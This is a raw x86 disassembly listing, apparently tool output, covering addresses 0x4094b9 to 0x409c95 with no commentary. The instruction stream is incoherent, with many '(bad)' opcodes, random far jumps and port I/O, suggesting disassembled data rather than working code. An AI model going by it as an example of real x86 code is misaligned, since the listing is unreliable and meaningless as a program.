  4094b9:	loope  0x409451
  4094bb:	sbb    BYTE PTR [ebp+0x5aa54844],al
  4094c1:	(bad)  
  4094c2:	out    0xd3,eax
  4094c4:	fdivr  QWORD PTR [edi+0xe]
  4094c7:	add    BYTE PTR [ebp+0x64],dl
  4094ca:	xchg   ecx,eax
  4094cb:	(bad)  
  4094cc:	loopne 0x40953d
  4094ce:	imul   edx,DWORD PTR [edi],0xffffffb6
  4094d1:	ret    0x402
  4094d4:	mov    es,WORD PTR [ebx-0x24e1cbce]
  4094da:	mov    dh,0x8
  4094dc:	ins    BYTE PTR es:[edi],dx
  4094dd:	pop    ds
  4094de:	mov    bh,0x76
  4094e0:	pop    esp
  4094e1:	push   ecx
  4094e2:	adc    al,0xe3
  4094e4:	clc    
  4094e5:	lahf   
  4094e6:	call   DWORD PTR [ebx-0x41279fbc]
  4094ec:	outs   dx,BYTE PTR ds:[esi]
  4094ed:	ins    BYTE PTR es:[edi],dx
  4094ee:	fcom   st(4)
  4094f0:	stc    
  4094f1:	aad    0x8b
  4094f3:	jg     0x409484
  4094f5:	adc    al,0xbc
  4094f7:	lea    esp,[ebp-0x68d7a3f8]
  4094fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094fe:	aas    
  4094ff:	adc    al,0x4b
  409501:	xchg   DWORD PTR [edi+0x52c2d1ad],esi
  409507:	xchg   ecx,eax
  409508:	mov    eax,0x97713a98
  40950d:	out    dx,eax
  40950e:	(bad)  
  40950f:	sub    DWORD PTR [eax],ebp
  409511:	dec    eax
  409513:	inc    esi
  409514:	jg     0x409557
  409516:	loopne 0x409518
  409518:	mov    ecx,0xe8ca00f1
  40951d:	(bad)  
  40951e:	sub    al,0x75
  409520:	pop    ebx
  409521:	popf   
  409522:	mov    bh,0x41
  409524:	scas   al,BYTE PTR es:[edi]
  409525:	dec    ecx
  409526:	aas    
  409527:	push   ds
  409528:	add    BYTE PTR [eax],0xd9
  40952b:	retf   
  40952c:	add    dh,BYTE PTR [edi-0x55ff6e0e]
  409532:	mov    BYTE PTR [ebp-0x73605a29],ch
  409538:	jmp    0xb5aac79
  40953d:	or     ch,ah
  40953f:	inc    ebp
  409540:	jg     0x409517
  409542:	cvtpi2ps xmm0,mm0
  409545:	rcl    bl,cl
  409547:	sub    eax,0xe8bf7e40
  40954c:	fistp  WORD PTR ds:0xb651b405
  409552:	mov    bl,0x3f
  409554:	mov    dl,0x5f
  409556:	fs shrd eax,ecx,cl
  40955a:	adc    ch,ch
  40955c:	mov    dh,0xbf
  40955e:	in     eax,0x62
  409560:	stos   BYTE PTR es:[edi],al
  409561:	sub    al,0xc5
  409563:	jg     0x409522
  409565:	and    DWORD PTR [esi-0x1a],ebp
  409568:	in     eax,0xea
  40956a:	mov    cl,0x39
  40956c:	add    BYTE PTR ds:0x9c1935e3,bh
  409572:	stc    
  409573:	ins    DWORD PTR es:[edi],dx
  409574:	add    DWORD PTR [esi-0x6d],0x1acb5fe1
  40957b:	rol    DWORD PTR [eax],1
  40957d:	pop    ebx
  40957e:	ret    0x8360
  409581:	add    eax,0x80a37f57
  409586:	push   eax
  409587:	test   ch,ah
  409589:	or     ebx,esp
  40958b:	fdivr  st,st(3)
  40958d:	cwde   
  40958e:	sbb    BYTE PTR [eax+edi*2+0x3e0029ff],bl
  409595:	or     eax,0x915b0b8d
  40959a:	loop   0x409600
  40959c:	test   DWORD PTR [edi-0x12],esp
  40959f:	les    edi,FWORD PTR [edi]
  4095a1:	cwde   
  4095a2:	xchg   edi,eax
  4095a3:	cs ins DWORD PTR es:[edi],dx
  4095a5:	clc    
  4095a6:	xchg   ebx,eax
  4095a7:	out    dx,eax
  4095a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a9:	sub    edi,DWORD PTR [edi-0x7e26ff7c]
  4095af:	sbb    edx,DWORD PTR [esi+ebp*1]
  4095b2:	addr16 mov ds:0xdb0,al
  4095b6:	retf   
  4095b7:	xor    ax,0x87ff
  4095bb:	pop    ebx
  4095bc:	lods   eax,DWORD PTR ds:[esi]
  4095bd:	jns    0x4095dd
  4095bf:	add    ah,al
  4095c1:	xchg   esp,eax
  4095c2:	into   
  4095c3:	or     eax,0x634f41f2
  4095c8:	sti    
  4095c9:	outs   dx,BYTE PTR ds:[esi]
  4095ca:	dec    ebp
  4095cb:	mov    edi,0x99d1bfa9
  4095d0:	and    ebx,DWORD PTR [ebp+0x2e0fefd1]
  4095d6:	aaa    
  4095d7:	outs   dx,DWORD PTR ds:[esi]
  4095d8:	jno    0x4095b8
  4095da:	popa   
  4095db:	call   DWORD PTR [edi+0x0]
  4095de:	mov    DWORD PTR [eax-0x5230900],ebp
  4095e4:	fcmovne st,st(0)
  4095e6:	bnd ja 0x4095a8
  4095e9:	mov    eax,0x198a0700
  4095ee:	mov    ecx,0xf0b6ed86
  4095f3:	add    DWORD PTR [edi],edi
  4095f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095f6:	mov    ebx,0x30aeef2e
  4095fb:	xlat   BYTE PTR ds:[ebx]
  4095fc:	adc    BYTE PTR [ebp+0x64],ch
  4095ff:	cmp    DWORD PTR [ecx-0x37efa8c1],0xae6d2ed8
  409609:	ret    
  40960a:	mov    edi,0x6ebc47ad
  40960f:	ds cmp edx,ebp
  409612:	cmp    BYTE PTR [edi-0x1c04865],dl
  409618:	add    BYTE PTR [esp+esi*1],ah
  40961b:	add    BYTE PTR [ebx+0x4d],ch
  40961e:	xchg   edi,eax
  40961f:	dec    eax
  409620:	jbe    0x4095e3
  409622:	and    eax,0x7fc4a3bf
  409627:	lods   eax,DWORD PTR ds:[esi]
  409628:	jg     0x409669
  40962a:	mov    dl,0x55
  40962c:	loope  0x409656
  40962e:	sbb    al,0xbf
  409630:	pop    ds
  409631:	jbe    0x409658
  409633:	add    BYTE PTR [edi+0x2e],ch
  409636:	mov    dh,0x6d
  409638:	mov    ch,0xcb
  40963a:	add    BYTE PTR [esi+0x67],bh
  40963d:	sub    al,0xbf
  40963f:	jg     0x40962e
  409641:	ret    0xfe7b
  409644:	xchg   esi,eax
  409645:	(bad)  
  409646:	mov    ecx,0xb4bfcfd0
  40964b:	xor    eax,0x17005d1e
  409650:	push   esi
  409651:	add    BYTE PTR [esi],al
  409653:	setb   BYTE PTR [edi+0xe0f37e5]
  40965a:	pop    ds
  40965b:	add    BYTE PTR [ebp-0x77c0bf93],dh
  409661:	pusha  
  409662:	fld    TBYTE PTR [esi]
  409664:	fs jle 0x40961b
  409667:	push   esi
  409668:	xchg   ecx,eax
  409669:	jp     0x409652
  40966b:	arpl   WORD PTR [edi+0x5c],ax
  40966e:	jp     0x4096af
  409670:	into   
  409671:	outs   dx,BYTE PTR ds:[esi]
  409672:	mov    al,ds:0xc2fbf4e
  409677:	push   DWORD PTR [edi+0x4df6adc2]
  40967d:	mov    bh,0x6b
  40967f:	mov    dl,0xea
  409681:	push   esp
  409682:	and    al,BYTE PTR [ecx-0x3e]
  409685:	les    esp,FWORD PTR [ebx+0x3f02f979]
  40968b:	sbb    eax,0xf2c16600
  409690:	add    BYTE PTR [eax],ch
  409692:	or     bh,bh
  409694:	js     0x4096c4
  409696:	ins    DWORD PTR es:[edi],dx
  409697:	ins    DWORD PTR es:[edi],dx
  409698:	or     eax,ecx
  40969a:	jecxz  0x40970b
  40969c:	mov    edi,0xfbe9244
  4096a1:	fcomp  QWORD PTR [edx-0x28]
  4096a4:	scas   al,BYTE PTR es:[edi]
  4096a5:	repz dec ecx
  4096a7:	test   BYTE PTR [ebp-0x2c0a381],0x9a
  4096ae:	xchg   edi,eax
  4096af:	outs   dx,BYTE PTR ds:[esi]
  4096b0:	or     ebp,eax
  4096b2:	xabort 0x5a
  4096b5:	pop    es
  4096b6:	mov    edi,0xc8ed00a4
  4096bb:	and    cl,BYTE PTR ds:0x33d6140b
  4096c1:	mov    dh,0x7f
  4096c3:	nop
  4096c4:	ret    
  4096c5:	adc    DWORD PTR [edi],esi
  4096c7:	xchg   esi,eax
  4096c8:	adc    cl,0x4b
  4096cb:	xchg   esi,eax
  4096cc:	aas    
  4096cd:	retf   
  4096ce:	push   DWORD PTR [edi]
  4096d0:	fcmovb st,st(2)
  4096d2:	lods   eax,DWORD PTR ds:[esi]
  4096d3:	rcr    DWORD PTR [edi+0x3a],0xcc
  4096d7:	sbb    edi,eax
  4096d9:	lds    esp,FWORD PTR [ebp-0x37252fb2]
  4096df:	push   edx
  4096e0:	sbb    ebp,DWORD PTR [edi+0x59]
  4096e3:	aas    
  4096e4:	jge    0x409696
  4096e6:	cmp    BYTE PTR [ebx+0x60],bl
  4096e9:	stc    
  4096ea:	aaa    
  4096eb:	setp   BYTE PTR [eax+0x3b9500]
  4096f2:	out    0xaa,eax
  4096f4:	stc    
  4096f5:	jb     0x409735
  4096f7:	or     esi,DWORD PTR [edx+ebx*2]
  4096fa:	popa   
  4096fb:	jp     0x409758
  4096fd:	shr    DWORD PTR [eax+0x37cfa63f],0xb6
  409704:	and    eax,DWORD PTR ds:0xff7e9b10
  40970a:	out    0x0,eax
  40970c:	iret   
  40970d:	les    edx,FWORD PTR [edx-0x53]
  409710:	mov    dh,0x75
  409712:	ins    DWORD PTR es:[edi],dx
  409713:	cmc    
  409714:	sub    eax,0xc041a7bb
  409719:	dec    edx
  40971a:	or     dh,BYTE PTR [ecx+0x36b6dc6d]
  409720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409721:	popa   
  409722:	bound  ecx,QWORD PTR ds:0x8f297542
  409728:	dec    eax
  409729:	mov    ds:0xaead85c2,eax
  40972e:	jno    0x409768
  409730:	retf   0xbc1b
  409733:	call   0xda6d:0xdadda19d
  40973a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40973b:	lods   eax,DWORD PTR ds:[esi]
  40973c:	jl     0x409764
  40973e:	sahf   
  40973f:	push   cs
  409740:	xor    esp,ebx
  409742:	inc    eax
  409743:	mov    dh,0x8d
  409745:	mov    dl,0x74
  409747:	out    dx,al
  409748:	add    edx,DWORD PTR [edx+0xb4a69c7]
  40974e:	push   ss
  40974f:	adc    edx,DWORD PTR [eax]
  409751:	(bad)  
  409753:	sti    
  409754:	add    ah,BYTE PTR [edi]
  409756:	push   es
  409757:	cwde   
  409758:	std    
  409759:	outs   dx,BYTE PTR ds:[esi]
  40975a:	xor    al,0xb6
  40975c:	pop    ebx
  40975d:	stc    
  40975e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40975f:	sub    eax,0x1b4cce3e
  409764:	outs   dx,DWORD PTR ds:[esi]
  409765:	push   ds
  409766:	mov    al,ds:0xd5112da
  40976b:	mov    edi,0x5baddd42
  409770:	fadd   st,st(6)
  409772:	fsub   DWORD PTR [ebp+0x6c]
  409775:	aas    
  409776:	fisttp QWORD PTR [edi+0x8d66196]
  40977c:	push   0xf616db7
  409781:	ror    BYTE PTR [edi+0x67a56b0],1
  409787:	adc    DWORD PTR [esp+edi*2+0x69],ebx
  40978b:	pop    ebx
  40978c:	fdiv   DWORD PTR [ebp-0x6]
  40978f:	sbb    DWORD PTR [esi+0x5],esi
  409792:	pop    esi
  409793:	and    ebx,DWORD PTR [edi-0x1c]
  409796:	add    BYTE PTR [ebx],bl
  409798:	ins    DWORD PTR es:[edi],dx
  409799:	mov    ebx,0xe86ab0b0
  40979e:	fs retf 0xf18e
  4097a2:	lods   eax,DWORD PTR ds:[esi]
  4097a3:	(bad)  
  4097a4:	push   eax
  4097a5:	ins    DWORD PTR es:[edi],dx
  4097a6:	sub    al,0x6d
  4097a8:	ins    BYTE PTR es:[edi],dx
  4097a9:	jecxz  0x4097ac
  4097ab:	cdq    
  4097ac:	cmp    al,0xc7
  4097af:	outs   dx,DWORD PTR ds:[esi]
  4097b0:	add    esi,DWORD PTR [ebp+0x1db6db5b]
  4097b6:	cmp    eax,0x6808c42f
  4097bb:	or     bl,BYTE PTR [edi+ebp*8+0x56]
  4097bf:	mov    dh,0xdb
  4097c1:	inc    esi
  4097c2:	mov    ebx,0xd7aa49c8
  4097c7:	pop    ebp
  4097c8:	fild   QWORD PTR [ebp+0x248c2624]
  4097ce:	loopne 0x409816
  4097d0:	mov    ebx,0x8b6635d1
  4097d5:	cmc    
  4097d6:	jno    0x40984d
  4097d8:	sub    al,0xbb
  4097da:	lea    ebp,[ebp-0x1c]
  4097dd:	(bad)  
  4097de:	mov    edi,0x260085db
  4097e3:	mov    bh,0x0
  4097e5:	sub    eax,0x30bf5328
  4097ea:	mov    ah,0xdd
  4097ec:	push   ss
  4097ed:	mov    dh,0xe4
  4097ef:	xor    eax,0x2f63caa3
  4097f4:	push   ds
  4097f5:	inc    ebx
  4097f6:	(bad)  
  4097f7:	std    
  4097f8:	push   0xffffffa3
  4097fa:	xor    eax,0x707f6f
  4097ff:	add    eax,0xc1ff3bb3
  409804:	mov    bh,0xad
  409806:	sbb    eax,0x12f03f59
  40980b:	xchg   esp,eax
  40980c:	jmp    0x1e66b128
  409811:	sub    eax,0x42ce13b6
  409816:	mov    edi,0x53ae7f58
  40981b:	sbb    ebp,0x71d81646
  409821:	add    edi,edi
  409823:	ret    0xd732
  409826:	inc    ebp
  409827:	jnp    0x40981c
  409829:	push   es
  40982a:	and    ecx,DWORD PTR [ebx+0x3f]
  40982d:	sub    ah,bl
  40982f:	mov    edi,0xc6a100dc
  409834:	inc    edx
  409835:	cmp    al,0x7f
  409837:	nop
  409838:	add    BYTE PTR [eax+0x17],ah
  40983b:	add    bh,ch
  40983d:	in     al,0x8d
  40983f:	add    ecx,DWORD PTR [ebp-0x1c]
  409842:	fdivr  QWORD PTR [esp+ebx*1-0x701bc057]
  409849:	or     BYTE PTR [eax],al
  40984b:	jne    0x4098c3
  40984d:	add    BYTE PTR [ebx],bl
  40984f:	imul   edi,DWORD PTR [ebx-0x2a934dcb],0xffffffbb
  409856:	sbb    al,0xa5
  409858:	push   cs
  409859:	and    BYTE PTR [edi-0x26],bh
  40985c:	mov    edx,0xb17c10b1
  409861:	(bad)  [esi+0x42b71c46]
  409867:	in     eax,dx
  409868:	push   ss
  409869:	pop    ecx
  40986a:	mov    edi,0x488a3260
  40986f:	mov    edi,0xc1b236c2
  409874:	(bad)  
  409875:	rcl    BYTE PTR [ecx+0x5d],cl
  409878:	mov    edi,0xeb0b69fa
  40987d:	mov    cl,BYTE PTR [ebx]
  40987f:	in     eax,dx
  409880:	test   al,0xed
  409882:	xor    eax,0xff36f3c4
  409887:	jge    0x40982a
  409889:	fimul  DWORD PTR [edx]
  40988b:	ins    DWORD PTR es:[edi],dx
  40988c:	imul   ecx,DWORD PTR [edx],0xffffffac
  40988f:	dec    eax
  409890:	mov    al,0x50
  409892:	clc    
  409893:	test   al,0x76
  409895:	popa   
  409896:	fistp  DWORD PTR [esi+0x4326f13f]
  40989c:	sbb    DWORD PTR [ebp+0x1a14ea5e],0xffffffb6
  4098a3:	fcmovbe st,st(2)
  4098a5:	lea    ecx,[edx+eiz*2]
  4098a8:	jmp    0xfdde:0x52984e0b
  4098af:	xchg   esi,eax
  4098b0:	dec    edi
  4098b1:	fdiv   QWORD PTR [esi-0x3a800f49]
  4098b7:	aaa    
  4098b8:	test   BYTE PTR [edi-0x48e55147],bh
  4098be:	fidiv  DWORD PTR [esi-0x756a0b44]
  4098c4:	pop    esp
  4098c5:	fdivr  QWORD PTR [edx-0x26]
  4098c8:	jnp    0x4098ff
  4098ca:	ds mov bh,0xda
  4098cd:	mov    edi,0x1b26bfd5
  4098d2:	loope  0x409880
  4098d4:	sbb    BYTE PTR [esi],bh
  4098d6:	ins    DWORD PTR es:[edi],dx
  4098d7:	pop    ds
  4098d8:	mov    eax,0xf90427da
  4098dd:	js     0x409954
  4098df:	add    eax,0x8379bf40
  4098e4:	fist   WORD PTR [esi+0x4c64d8be]
  4098ea:	aas    
  4098eb:	ins    DWORD PTR es:[edi],dx
  4098ec:	ret    0x98ae
  4098ef:	fistp  WORD PTR [eax+eax*1]
  4098f2:	sahf   
  4098f3:	and    eax,0x2fb56d2e
  4098f8:	and    eax,DWORD PTR [edx-0x5e55945c]
  4098fe:	jg     0x40990c
  409900:	xor    al,0x6e
  409902:	out    0x48,al
  409904:	add    BYTE PTR [edi+0x23],cl
  409907:	stc    
  409908:	cmp    al,0xdb
  40990a:	push   DWORD PTR [esi+0x2db6362]
  409910:	ficom  WORD PTR [ecx]
  409912:	sbb    DWORD PTR [eax],0x74a2ff35
  409918:	jmp    0x4098d3
  40991a:	xchg   ebp,eax
  40991b:	lods   eax,DWORD PTR ds:[esi]
  40991c:	mov    edi,0xb5a6a1a2
  409921:	out    0x68,al
  409923:	pop    ebp
  409924:	sbb    cl,bl
  409926:	stos   BYTE PTR es:[edi],al
  409927:	mov    DWORD PTR [edi-0x40ef5929],edi
  40992d:	xor    BYTE PTR [edi],0x36
  409930:	fidiv  DWORD PTR [esi+0xd7a7f4d]
  409936:	mov    dh,0x48
  409938:	xchg   DWORD PTR [esi-0x4e],edi
  40993b:	ins    DWORD PTR es:[edi],dx
  40993c:	fcmovne st,st(2)
  40993e:	fild   WORD PTR [eax]
  409940:	jg     0x409988
  409942:	adc    eax,0xe49f00
  409947:	jecxz  0x4098ea
  409949:	dec    esp
  40994a:	xlat   BYTE PTR ds:[ebx]
  40994b:	fcomp  st(0)
  40994d:	mov    dh,0x6d
  40994f:	inc    eax
  409950:	pop    DWORD PTR [esp+ebp*8+0x58]
  409954:	add    bl,BYTE PTR [ebx+ebx*8+0x50]
  409958:	lea    ebx,[edi-0x24]
  40995b:	fmul   DWORD PTR [ebp+0x3fe50cb3]
  409961:	call   FWORD PTR [edx]
  409963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409964:	mov    ah,0x69
  409966:	fs stc 
  409968:	adc    bh,BYTE PTR [edi+0x7]
  40996b:	xor    BYTE PTR [eax],al
  40996d:	fistp  DWORD PTR [ebx-0x525a46ce]
  409973:	mov    al,0x71
  409975:	and    edi,DWORD PTR [edx+0x18]
  409978:	adc    eax,DWORD PTR [ebx+0x65]
  40997b:	and    bh,BYTE PTR [edi-0x35272447]
  409981:	mov    eax,ds:0x6f5a771
  409986:	ret    0xf7bf
  409989:	add    BYTE PTR [ecx],al
  40998b:	lods   eax,DWORD PTR ds:[esi]
  40998c:	enter  0x6da5,0xba
  409990:	cwde   
  409991:	sbb    DWORD PTR [edi-0xf801ad6],edi
  409997:	or     esi,DWORD PTR [esi-0x463b0826]
  40999d:	scas   eax,DWORD PTR es:[edi]
  40999e:	sbb    BYTE PTR [edi-0x1e],bh
  4099a1:	mov    edi,0xada5da37
  4099a6:	push   ebp
  4099a7:	push   cs
  4099a8:	jmp    0xaccc:0x89c96986
  4099af:	or     cl,bl
  4099b1:	test   al,0x61
  4099b3:	imul   esi,DWORD PTR [ebx-0x208001d1],0x7f
  4099ba:	sbb    BYTE PTR [edi+0x37],bl
  4099bd:	inc    ebx
  4099be:	sbb    ebp,ebx
  4099c0:	adc    DWORD PTR [ebx+0x7f2c6f38],esp
  4099c6:	or     eax,0xb5b6db01
  4099cb:	dec    DWORD PTR [ebx]
  4099cd:	and    BYTE PTR [edx-0xd84aa],ch
  4099d3:	adc    BYTE PTR [edi-0x27c04926],dl
  4099d9:	push   0x97f52cd9
  4099de:	push   es
  4099df:	fdiv   DWORD PTR [esi-0x5e001693]
  4099e5:	xchg   ebp,eax
  4099e6:	fidivr WORD PTR gs:[edi+0x6da3ddd9]
  4099ed:	sub    DWORD PTR [edx+0x3dfa7f5c],esi
  4099f3:	mov    BYTE PTR [edi+0x8c0bfb5],cl
  4099f9:	mov    ah,0xcf
  4099fb:	add    bh,BYTE PTR [ebx]
  4099fd:	ror    DWORD PTR [edx+eax*8+0x3db6a6ff],0x74
  409a05:	leave  
  409a06:	aas    
  409a07:	lds    ebx,FWORD PTR [esi]
  409a09:	pop    ds
  409a0a:	mov    edi,0xe35eefed
  409a0f:	imul   edi,DWORD PTR [ebx],0x7fe5c4b2
  409a15:	into   
  409a16:	sub    al,BYTE PTR [ebx]
  409a18:	mov    eax,ds:0xc6a5bfd4
  409a1d:	jbe    0x409a03
  409a1f:	mov    BYTE PTR [ecx-0x6ced5859],0x2
  409a26:	lea    esi,[esi+0x246c8dc6]
  409a2c:	iret   
  409a2d:	data16 sub WORD PTR ds:0x6cad847f,0xff9c
  409a36:	out    dx,al
  409a37:	xor    BYTE PTR [ebp+eiz*2+0x42],dh
  409a3b:	jg     0x409a18
  409a3d:	lods   eax,DWORD PTR ds:[esi]
  409a3e:	mov    dh,0x70
  409a40:	dec    ecx
  409a41:	xchg   edi,eax
  409a42:	push   ss
  409a43:	stos   BYTE PTR es:[edi],al
  409a44:	outs   dx,BYTE PTR ds:[esi]
  409a45:	jg     0x409a21
  409a47:	ret    0x9659
  409a4a:	fidiv  DWORD PTR [esi+0xde20b6d]
  409a50:	inc    edi
  409a51:	ror    DWORD PTR [ebx],1
  409a53:	bound  edi,QWORD PTR [ecx-0x3d34fa0f]
  409a59:	jbe    0x4099ff
  409a5b:	aas    
  409a5c:	mov    esp,0xbb64cbfb
  409a61:	repz push 0x6d2b70ab
  409a67:	push   esi
  409a68:	int    0xad
  409a6a:	imul   edx,DWORD PTR [edx],0xffffff99
  409a6d:	popa   
  409a6e:	jg     0x4099fd
  409a70:	ins    DWORD PTR es:[edi],dx
  409a71:	and    DWORD PTR [edx-0x65],esi
  409a74:	rol    BYTE PTR [eax+0x48],1
  409a77:	xchg   BYTE PTR ds:0x8dc07630,bl
  409a7d:	shr    BYTE PTR [esi],cl
  409a7f:	test   BYTE PTR [ebx],0x63
  409a82:	xchg   esi,eax
  409a83:	push   ecx
  409a84:	jmp    DWORD PTR [edx+0x4b]
  409a87:	sub    al,0x6d
  409a89:	sub    eax,0x79a33894
  409a8e:	ror    BYTE PTR [ebx+0x26],1
  409a91:	test   DWORD PTR [esp+ebx*8],edi
  409a94:	sahf   
  409a95:	or     edi,DWORD PTR [edi]
  409a97:	jmp    0x7fd4:0x532f4934
  409a9e:	fstp   TBYTE PTR [edi+0x6f9cb3c0]
  409aa4:	adc    al,0xb9
  409aa6:	div    BYTE PTR [edi]
  409aa8:	and    al,0x0
  409aaa:	sti    
  409aab:	jge    0x409a7a
  409aad:	fdivr  QWORD PTR [esp+ebp*1+0x0]
  409ab1:	call   edx
  409ab3:	enter  0x7700,0x9b
  409ab7:	(bad)  
  409ab8:	add    DWORD PTR [edi],esi
  409aba:	mov    dh,0x6d
  409abc:	cmp    eax,DWORD PTR [esi+0x42]
  409abf:	pop    ds
  409ac0:	and    bh,bh
  409ac2:	pop    ebp
  409ac3:	mov    bl,0x3a
  409ac5:	mov    dl,0xd4
  409ac7:	ret    0x4ccc
  409aca:	and    edi,edi
  409acc:	out    dx,al
  409acd:	xor    eax,0xd1b23bf8
  409ad2:	push   esi
  409ad3:	cmc    
  409ad4:	bound  esi,QWORD PTR ds:0x8c49927f
  409ada:	cmc    
  409adb:	aaa    
  409adc:	push   ds
  409add:	outs   dx,BYTE PTR ds:[esi]
  409ade:	pop    ebx
  409adf:	ds pop ecx
  409ae1:	mov    ecx,0x8e7fa56a
  409ae6:	aas    
  409ae7:	mov    bh,0xb0
  409ae9:	shl    dh,0xb0
  409aec:	ins    DWORD PTR es:[edi],dx
  409aed:	ds in  eax,dx
  409aef:	mov    bl,0x93
  409af1:	jg     0x409b6c
  409af3:	add    dl,0xb1
  409af6:	aad    0x18
  409af8:	mov    ecx,0x873c6f3f
  409afd:	and    DWORD PTR [ebp-0x7d],ebp
  409b00:	jge    0x409b70
  409b02:	xor    DWORD PTR [edx+0x3f9b523f],esi
  409b08:	push   0x62
  409b0a:	jb     0x409b3b
  409b0c:	(bad)  
  409b0d:	mov    dh,0x70
  409b0f:	test   eax,0x537a32b3
  409b14:	popf   
  409b15:	cmp    DWORD PTR [ebp+0x78],edi
  409b18:	stc    
  409b19:	xchg   ecx,eax
  409b1a:	in     eax,0x73
  409b1c:	mov    edi,edi
  409b1e:	xchg   esi,eax
  409b1f:	inc    eax
  409b20:	adc    cl,BYTE PTR [edi+0x8]
  409b23:	add    DWORD PTR [esi],ebp
  409b25:	sub    eax,0x5be080b4
  409b2a:	call   0x76c2:0x7fbfdf89
  409b31:	stc    
  409b32:	(bad)  
  409b33:	arpl   bp,bp
  409b35:	lods   eax,DWORD PTR ds:[esi]
  409b36:	add    BYTE PTR [esi-0x4e43d86f],dl
  409b3c:	dec    ecx
  409b3d:	in     eax,dx
  409b3e:	sub    esi,DWORD PTR [esi+0x5fff50a5]
  409b44:	cmp    edi,0x79
  409b47:	jecxz  0x409b19
  409b49:	cmp    ch,BYTE PTR [eax-0x49]
  409b4c:	inc    edx
  409b4d:	sub    DWORD PTR [ebx],ecx
  409b4f:	retf   0xbf71
  409b52:	dec    eax
  409b53:	sub    BYTE PTR ds:0xafbb5b6d,0x62
  409b5a:	jo     0x409b1b
  409b5c:	sub    BYTE PTR [edi],0x71
  409b5f:	or     dh,BYTE PTR [esi-0x44a49352]
  409b65:	mov    ah,0xbf
  409b67:	out    0x86,eax
  409b69:	jmp    0x5bf70fd4
  409b6e:	jge    0x409b71
  409b70:	dec    edx
  409b71:	mov    cl,0xb0
  409b73:	ins    DWORD PTR es:[edi],dx
  409b74:	inc    edx
  409b75:	xchg   BYTE PTR [ebx],ah
  409b77:	sahf   
  409b78:	test   eax,0xb183ace
  409b7d:	paddusb mm7,QWORD PTR [ebx]
  409b80:	loopne 0x409bd7
  409b82:	aas    
  409b83:	fbstp  TBYTE PTR [edx+0x6db8ffe2]
  409b89:	fild   DWORD PTR [ecx-0x40dc4c1]
  409b8f:	not    BYTE PTR [edx-0x4a458306]
  409b95:	adc    eax,ebx
  409b97:	arpl   WORD PTR [eax-0x10b877c1],ax
  409b9d:	push   cs
  409b9e:	nop
  409b9f:	rol    BYTE PTR [ebx],cl
  409ba1:	mov    cl,0xf8
  409ba3:	jg     0x409bbb
  409ba5:	aas    
  409ba6:	aas    
  409ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ba8:	xchg   edx,eax
  409ba9:	arpl   WORD PTR [esi+edx*4],ax
  409bac:	(bad)  
  409bad:	jmp    FWORD PTR [edx]
  409baf:	cs aas 
  409bb1:	call   DWORD PTR ss:[edi]
  409bb4:	fisub  DWORD PTR ss:[ebp+0x3a]
  409bb8:	ror    BYTE PTR ds:[ecx+0x4a4f46a8],0xcc
  409bc0:	hlt    
  409bc1:	je     0x409be4
  409bc3:	add    bh,bh
  409bc5:	jg     0x409c1d
  409bc7:	fdivr  DWORD PTR [edi-0x3a04b9a2]
  409bcd:	pop    eax
  409bce:	mov    edi,0xf06e3fe8
  409bd3:	sti    
  409bd4:	jnp    0x409b8d
  409bd6:	neg    BYTE PTR [ecx-0x20]
  409bd9:	jbe    0x409bd3
  409bdb:	(bad)  
  409bdc:	cld    
  409bdd:	add    BYTE PTR [edi+ecx*4],0xef
  409be1:	mov    cl,BYTE PTR [ebx+edx*8]
  409be4:	sub    al,0xb6
  409be6:	or     al,BYTE PTR [ebx+0x3a]
  409be9:	xchg   edx,eax
  409bea:	(bad)  
  409beb:	mov    edi,0x543a6891
  409bf0:	and    BYTE PTR [edi-0x41],bh
  409bf3:	sub    al,0x7f
  409bf5:	add    al,bh
  409bf7:	push   0xbabf34a0
  409bfc:	aas    
  409bfd:	ret    0xff44
  409c00:	leave  
  409c01:	ja     0x409baf
  409c03:	ss dec esp
  409c05:	mov    edi,0xbf58d67f
  409c0a:	fiadd  WORD PTR [esi+0x69]
  409c0d:	cmp    edx,DWORD PTR [eax]
  409c0f:	adc    eax,0xf8523efe
  409c14:	cdq    
  409c15:	mov    dh,0xd6
  409c17:	in     eax,0xdb
  409c19:	and    ecx,DWORD PTR [eax]
  409c1b:	dec    esp
  409c1c:	pushf  
  409c1d:	add    BYTE PTR [ebx+0x4a5576e6],cl
  409c23:	(bad)  
  409c24:	ins    DWORD PTR es:[edi],dx
  409c25:	aaa    
  409c26:	xchg   esi,eax
  409c27:	ss pusha 
  409c29:	in     al,0x2f
  409c2b:	out    0x96,eax
  409c2d:	sbb    eax,0xda09b915
  409c32:	(bad)  
  409c33:	lea    esi,[esi-0x18b8e4aa]
  409c39:	xchg   ebp,eax
  409c3a:	xlat   BYTE PTR ds:[ebx]
  409c3b:	outs   dx,DWORD PTR ds:[esi]
  409c3c:	mov    esi,0x4a1a95e3
  409c41:	xchg   edi,eax
  409c42:	sub    esp,ecx
  409c44:	xor    bl,BYTE PTR [edx]
  409c46:	test   DWORD PTR [ebx-0x41],0xb6c2c6e1
  409c4d:	cmp    eax,DWORD PTR [eax+0x578893ec]
  409c53:	ror    BYTE PTR [ecx+0x1b6dc1b5],cl
  409c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c5a:	ins    DWORD PTR es:[edi],dx
  409c5b:	mov    DWORD PTR ds:0x1ba2b09b,ebx
  409c61:	out    0xb5,al
  409c63:	outs   dx,BYTE PTR ds:[esi]
  409c64:	sub    al,0x6d
  409c66:	ins    BYTE PTR es:[edi],dx
  409c67:	mov    ds:0x14391519,eax
  409c6c:	lods   eax,DWORD PTR ds:[esi]
  409c6d:	(bad)  
  409c6e:	jmp    0x5890f67d
  409c73:	fcomp  DWORD PTR [edx]
  409c75:	sbb    DWORD PTR [edi],ebx
  409c77:	(bad)  [edx-0x569224fc]
  409c7d:	fnstsw WORD PTR [ecx-0x15b91cf]
  409c83:	add    BYTE PTR [edx-0x224cb1f8],dl
  409c89:	mov    ebx,0xcd13e914
  409c8e:	jae    0x409c8c
  409c90:	add    eax,0x2c9910aa
  409c95:	shl    BYTE PTR [esi+0x719d6d6d],cl
